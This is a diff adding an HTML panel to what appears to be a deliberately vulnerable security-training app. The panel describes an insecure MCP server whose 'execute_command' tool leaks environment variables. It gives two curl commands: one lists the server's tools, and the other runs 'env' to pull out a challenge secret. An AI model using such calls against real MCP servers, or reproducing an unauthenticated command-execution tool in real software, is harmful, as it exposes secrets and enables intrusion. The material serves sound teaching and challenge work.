@@ -1,0 +1,19 @@
+<div id="mcp-challenge-container" style="border: 1px solid #ccc; border-radius: 8px; padding: 20px; margin: 20px; background-color: #f9f9f9;">
+    <h4>🤖 Insecure MCP Server Demo</h4>
+    <p>An insecure MCP (Model Context Protocol) server is running alongside this application on a dedicated port. It exposes an <code>execute_command</code> tool that leaks environment variables — including secrets.</p>
+
+    <div style="border: 1px solid #ffeaa7; border-radius: 6px; padding: 15px; margin: 15px 0; background-color: #fffde7;">
+        <p><strong>⚠️ The MCP server is running on port 8090.</strong></p>
+        <p>Step 1 — Discover what tools the MCP server exposes:</p>
+        <pre style="background: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 13px;">curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'</pre>
+
+        <p style="margin-top: 12px;">Step 2 — Call the <code>execute_command</code> tool to retrieve environment variables:</p>
+        <pre style="background: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 13px;">curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'</pre>
+
+        <p style="margin-top: 12px;"><small style="color: #666;">💡 Tip: Look for the <code>WRONGSECRETS_MCP_SECRET</code> key in the response. The <code>/mcp</code> endpoint is also accessible on the main application port if port 8090 is not reachable.</small></p>
+    </div>
+</div>
